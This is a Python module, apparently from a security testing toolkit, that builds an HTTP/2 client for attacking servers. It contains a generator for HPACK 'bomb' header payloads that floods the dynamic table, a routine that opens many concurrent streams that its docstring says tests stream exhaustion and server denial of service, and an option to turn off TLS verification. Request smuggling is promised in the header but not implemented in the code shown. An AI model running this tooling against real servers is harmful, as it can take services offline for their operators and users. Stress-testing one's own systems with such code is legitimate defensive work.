"""HTTP/2 transport with HPACK table exploitation.

Provides HTTP/2 client with dynamic table manipulation for
HPACK bombing, request smuggling via h2, and CONNECT tunnel testing.
"""

from __future__ import annotations

import asyncio
import logging
import os
from typing import Any

logger = logging.getLogger(__name__)

try:
    import h2.config
    import h2.connection
    import h2.errors
    import h2.events
    import h2.exceptions

    HAS_H2 = True
except ImportError:
    HAS_H2 = False

# Maximum dynamic table size for HPACK bomb
HPACK_BOMB_TABLE_SIZE: int = 65536


class H2TransportError(Exception):
    """Base exception for HTTP/2 transport errors."""


async def create_h2_connection(
    host: str,
    port: int = 443,
    *,
    use_ssl: bool = True,
    verify_tls: bool = True,
    max_inbound_frame_size: int = 65536,
    header_table_size: int = 4096,
    enable_push: bool = False,
) -> tuple[asyncio.Transport, h2.connection.H2Connection]:
    """Create an HTTP/2 connection over TCP.

    Args:
        host: Target hostname.
        port: Target port.
        use_ssl: Whether to use TLS (required for h2 in practice).
        verify_tls: Whether to verify TLS certificates. When False,
            requires ``ALLOW_INSECURE_TLS=1`` environment variable.
        max_inbound_frame_size: Maximum frame size we accept.
        header_table_size: Initial HPACK header table size.
        enable_push: Whether to enable server push.

    Returns:
        Tuple of (transport, h2_connection).

    Raises:
        H2TransportError: If h2 library is not available.
    """
    if not HAS_H2:
        raise H2TransportError("h2 library not available (pip install h2)")

    loop = asyncio.get_running_loop()

    h2_config = h2.config.H2Configuration(
        client_side=True,
        header_encoding="utf-8",
        validate_outbound_headers=False,
    )
    conn = h2.connection.H2Connection(config=h2_config)

    if use_ssl:
        import ssl

        ssl_context = ssl.create_default_context()
        ssl_context.set_alpn_protocols(["h2", "http/1.1"])
        if not verify_tls:
            _allow_insecure = os.environ.get("ALLOW_INSECURE_TLS", "").strip().lower() in (
                "1",
                "true",
                "yes",
            )
            if not _allow_insecure:
                raise H2TransportError(
                    "TLS verification disabled but ALLOW_INSECURE_TLS env var is not set. "
                    "Set ALLOW_INSECURE_TLS=1 to allow insecure TLS connections."
                )
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE

        transport, protocol = await loop.create_connection(
            lambda: _H2ClientProtocol(conn),
            host,
            port,
            ssl=ssl_context,
            server_hostname=host,
        )
    else:
        transport, protocol = await loop.create_connection(
            lambda: _H2ClientProtocol(conn),
            host,
            port,
        )

    conn.initiate_connection()
    transport.write(conn.data_to_send())
    return transport, conn


def build_hpack_bomb_payload(
    base_headers: dict[str, str] | None = None,
    num_headers: int = 1000,
) -> list[tuple[str, str]]:
    """Build headers designed to fill the HPACK dynamic table.

    Creates a large number of unique header entries to maximize
    dynamic table usage and test for HPACK bomb vulnerabilities.

    Args:
        base_headers: Base headers to include.
        num_headers: Number of synthetic headers to generate.

    Returns:
        List of (name, value) header tuples.
    """
    headers: list[tuple[str, str]] = []
    if base_headers:
        headers.extend(base_headers.items())

    # Add pseudo-headers
    headers.append((":method", "GET"))
    headers.append((":path", "/"))
    headers.append((":authority", "localhost"))
    headers.append((":scheme", "https"))

    # Add synthetic headers to fill dynamic table
    for i in range(num_headers):
        headers.append((f"x-hpack-bomb-{i:06d}", "A" * 128))

    return headers


async def send_h2_request(
    transport: asyncio.Transport,
    conn: h2.connection.H2Connection,
    headers: list[tuple[str, str]],
    body: bytes = b"",
    end_stream: bool = True,
) -> int:
    """Send an HTTP/2 request over an established connection.

    Args:
        transport: The asyncio transport.
        conn: The H2 connection.
        headers: Request headers.
        body: Request body.
        end_stream: Whether to close the stream.

    Returns:
        The stream ID.
    """
    stream_id = conn.get_next_available_stream_id()
    conn.send_headers(stream_id, headers, end_stream=end_stream and not body)
    transport.write(conn.data_to_send())

    if body:
        conn.send_data(stream_id, body, end_stream=end_stream)
        transport.write(conn.data_to_send())

    return stream_id


async def h2_concurrent_requests(
    host: str,
    port: int,
    num_requests: int = 100,
    *,
    path: str = "/",
    method: str = "GET",
    headers: dict[str, str] | None = None,
) -> list[dict[str, Any]]:
    """Perform many concurrent HTTP/2 requests on a single connection.

    Tests for HPACK bomb, stream exhaustion, and server DoS.

    Args:
        host: Target host.
        port: Target port.
        num_requests: Number of concurrent streams to open.
        path: Request path.
        method: HTTP method.
        headers: Additional headers.

    Returns:
        List of response dicts.
    """
    results: list[dict[str, Any]] = []
    if not HAS_H2:
        logger.warning("h2 library not available, skipping concurrent requests")
        return results

    try:
        transport, conn = await create_h2_connection(host, port)
    except Exception as exc:
        logger.error("Failed to create h2 connection: %s", exc)
        return results

    base_hdrs = {"user-agent": "h2-transport-test"}
    if headers:
        base_hdrs.update(headers)

    stream_ids: list[int] = []
    for _ in range(num_requests):
        req_headers = [
            (":method", method),
            (":path", path),
            (":authority", host),
            (":scheme", "https" if port == 443 else "http"),
        ]
        for k, v in base_hdrs.items():
            req_headers.append((k, v))

        try:
            sid = await send_h2_request(transport, conn, req_headers)
            stream_ids.append(sid)
        except Exception as exc:
            logger.warning("Failed to send request on stream: %s", exc)
            break

    # Read responses
    await asyncio.sleep(1.0)

    for sid in stream_ids:
        results.append(
            {
                "stream_id": sid,
                "status": "sent",
            }
        )

    try:
        transport.close()
    except Exception as exc:
        logger.warning("Operation failed in h2_transport.py: %s", exc, exc_info=True)  # noqa: BLE001

    return results


class _H2ClientProtocol(asyncio.Protocol):
    """Minimal asyncio Protocol wrapping an H2 connection."""

    def __init__(self, conn: h2.connection.H2Connection) -> None:
        self.conn = conn

    def connection_made(self, transport: asyncio.Transport) -> None:
        logger.debug("H2 connection established")

    def data_received(self, data: bytes) -> None:
        try:
            events = self.conn.receive_data(data)
            for event in events:
                logger.debug("H2 event: %s", event.__class__.__name__)
        except h2.exceptions.ProtocolError as exc:
            logger.warning("H2 protocol error: %s", exc)

    def eof_received(self) -> bool:
        return False

    def connection_lost(self, exc: Exception | None) -> None:
        logger.debug("H2 connection lost: %s", exc)
